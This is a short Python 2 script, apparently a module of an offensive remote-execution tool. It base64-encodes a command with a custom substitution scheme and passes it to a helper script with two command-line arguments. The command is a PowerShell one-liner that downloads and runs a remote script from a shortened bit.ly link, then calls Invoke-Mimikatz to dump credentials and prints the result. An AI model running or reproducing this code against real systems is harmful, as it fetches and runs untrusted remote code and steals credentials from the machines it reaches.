import commands, base64
import re, sys
import subprocess



def customBase64(encodedTxt, decode=1):
	replacements_ = [['+', 'plus'], ['/', 'slash'], ['=', 'equal']]
	if decode == -1:
		encodedTxt = base64.b64encode(encodedTxt).encode('ascii')
		for i in replacements_:
			encodedTxt = encodedTxt.replace(i[0], i[1])
		return encodedTxt
	for i in replacements_:
		encodedTxt = encodedTxt.replace(i[::-1][0], i[::-1][1])
	return base64.b64decode(encodedTxt).encode('ascii')



exeCMD = lambda cmd : commands.getoutput("python modules/runCMD.py {} {} {}".format(customBase64(cmd, -1), sys.argv[1], sys.argv[2])).replace('\n', '')


dump_cred = exeCMD('powershell -C "IEX (New-Object Net.WebClient).DownloadString(\'http://bit.ly/1qMn59d\'); Invoke-Mimikatz -DumpCreds"')


print dump_cred
